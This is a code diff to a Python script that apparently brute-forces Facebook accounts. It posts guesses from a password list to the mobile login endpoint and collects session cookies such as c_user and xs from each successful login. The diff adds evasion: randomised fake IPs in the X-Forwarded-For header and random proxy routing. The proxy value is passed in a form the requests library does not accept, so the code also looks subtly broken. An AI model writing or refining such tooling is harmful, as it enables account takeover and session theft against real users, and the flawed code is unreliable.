@@ -80,11 +80,6 @@ def generate_unlimited_ips():
             if ip not in ips:  # Avoid duplicates
                 ips.add(ip)
                 return f"{ip}"
-                #print(ip)  # Print or yield the IP
-
-# Call the function to generate unlimited IPs
-ipz=generate_unlimited_ips()
-
 import time
 from datetime import datetime
 sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
@@ -1325,8 +1320,11 @@ def rndm4(uid,passlist):
         global loop
         global oks
         sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M4{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        ipz=generate_unlimited_ips()
+        port=random.choice(['80','443','8080'])
         session=requests.Session()
         session.headers.update({'X-Forwarded-For': ipz})
+        proxy_url = f"http://{ipz}:{port}"
         au=Ugen()
         try:
                 for pas in passlist:
@@ -1373,7 +1371,7 @@ def rndm4(uid,passlist):
 'user-agent': au,
 'x-asbd-id': '129477',
 'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
-                        session.post(f'https://p.facebook.com/login/device-based/login/async/',data=data,headers=headers).text
+                        session.post(f'https://p.facebook.com/login/device-based/login/async/',data=data,proxies=proxy_url,headers=headers).text
                         log_cookies=session.cookies.get_dict().keys()
                         if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                                         coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
